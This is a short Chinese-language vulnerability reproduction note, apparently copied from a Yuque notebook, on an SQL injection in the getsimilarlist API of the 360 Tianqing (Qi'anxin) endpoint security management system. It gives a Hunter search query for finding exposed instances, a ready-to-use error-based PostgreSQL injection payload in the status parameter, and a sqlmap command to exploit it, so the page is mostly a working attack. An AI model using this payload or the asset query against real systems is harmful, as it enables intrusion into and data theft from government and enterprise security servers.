# 360天擎终端安全管理系统getsimilarlist存在SQL注入漏洞

# 一、漏洞简介
天擎终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。该产品集防病毒、终端安全管控、终端准入、终端审计、外设管控、EDR等功能于一体，兼容不同操作系统和计算平台，帮助客户实现平台一体化、功能一体化、数据一体化的终端安全立体防护;奇安信360天擎getsimilarlist存在SQL注入漏洞，攻击者可通过此漏洞获取敏感信息。

# 二、影响版本
+ 360天擎终端安全管理系统

# 三、资产测绘
+ hunter`app.name=="天擎终端安全管理系统"`
+ 特征

![1699415110944-92dd0793-44ec-4b3a-8b0c-cddf0465a695.png](./img/K-Fg9AeJYyC3cDpF/1699415110944-92dd0793-44ec-4b3a-8b0c-cddf0465a695-289858.png)

# 四、漏洞复现
响应中存在`qzbkq1qpzzq`表示可能存在漏洞

```plain
/api/client/getsimilarlist?status[0,1]=(CAST((CHR(113)||CHR(122)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (8327=8327) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(122)||CHR(113)) AS NUMERIC))&status[0]=1
```

![1699415273715-cb428a2e-00fe-4bfd-ac82-8b24b00ae99e.png](./img/K-Fg9AeJYyC3cDpF/1699415273715-cb428a2e-00fe-4bfd-ac82-8b24b00ae99e-130863.png)

sqlmap

```plain
python3 sqlmap.py  -u "https://xx.xx.xx.xx/api/client/getsimilarlist?status[0,1]=1&status[0]=1" --batch
```

![1699415337786-67a38012-b2b5-492d-a8da-5dd43f15f543.png](./img/K-Fg9AeJYyC3cDpF/1699415337786-67a38012-b2b5-492d-a8da-5dd43f15f543-099829.png)



> 更新: 2024-02-29 23:57:16  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ll2p6g6smkyvov6w>